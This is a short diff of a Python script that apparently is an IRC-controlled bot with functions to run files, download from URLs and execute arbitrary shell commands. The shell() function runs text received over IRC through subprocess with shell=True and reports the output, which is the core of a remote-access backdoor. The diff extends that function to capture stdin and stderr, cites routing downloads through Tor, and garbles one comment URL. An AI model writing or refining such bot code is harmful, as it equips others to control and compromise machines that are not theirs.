@@ -56,7 +56,7 @@ def run():
 	else:
 		sendMsg(ircChanne, fileRun + " arquivo nao existe.")
 def download():
-#REFERENCIA http://stackoverflow.com/questions/1096379/how-to-make-urllib2-requests-through-tor-in-python
+#REFERENCIA http://stackoverflow.com/questions/1096379/how-to-make-urllstarib2-requests-through-tor-in-python
 	if urlDown.find("http://")!= -1 or urlDown.find("https://")!= -1:
 		try:
 			file_name = urlDown.split('/')[-1]
@@ -94,7 +94,7 @@ def listFile():
 		time.sleep(0.8)
 
 def shell():
-	process = subprocess.Popen(args=comando,stdout=subprocess.PIPE,shell=True)
+	process = subprocess.Popen(args=comando,stdout=subprocess.PIPE, stdin=subprocess.PIPE, stderr=subprocess.PIPE, shell= True)
 	outt = (process.communicate())
 	out2 = outt[0] #str(outt.decode('utf-8')) #str(outt.decode())
 	out3 = out2.split('\r\n')
@@ -316,4 +316,4 @@ def main():
 				if id == botNick:
 					startup()
 if __name__ == "__main__":
-	main()
+    main()
